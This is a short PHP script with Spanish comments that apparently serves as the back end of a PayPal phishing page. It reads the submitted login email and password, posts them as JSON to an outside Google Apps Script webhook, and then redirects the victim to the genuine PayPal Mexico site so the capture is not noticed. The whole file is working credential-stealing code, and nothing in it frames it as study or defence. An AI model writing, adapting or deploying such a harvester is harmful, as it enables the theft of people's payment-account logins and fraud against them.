<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);

if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $email = isset($_POST['login_email']) ? trim($_POST['login_email']) : '';
    $password = isset($_POST['login_password']) ? $_POST['login_password'] : '';

    $webhook_url = 'https://script.google.com/macros/s/AKfycbwpfTV_jdzEHn7-nOJo_ZxFi9a19OracIY4tWj4cOZWqq0e3yROcl50Q7LO0dyQNwnD/exec';

    $data = array(
        'login_email' => $email,
        'login_password' => $password
    );

    // Configurar opciones de contexto HTTP
    $options = array(
        'http' => array(
            'header'  => "Content-Type: application/json\r\n",
            'method'  => 'POST',
            'content' => json_encode($data),
            'ignore_errors' => true // muestra respuesta aunque sea error
        )
    );

    $context  = stream_context_create($options);
    $result = file_get_contents($webhook_url, false, $context);

    if ($result === FALSE) {
        die("Error enviando los datos a Google Script");
    }
 // ✅ Después de enviar, redirige al usuario
    header("Location: https://www.paypal.com/mx/webapps/mpp/account-selection");
    exit();


}
?>

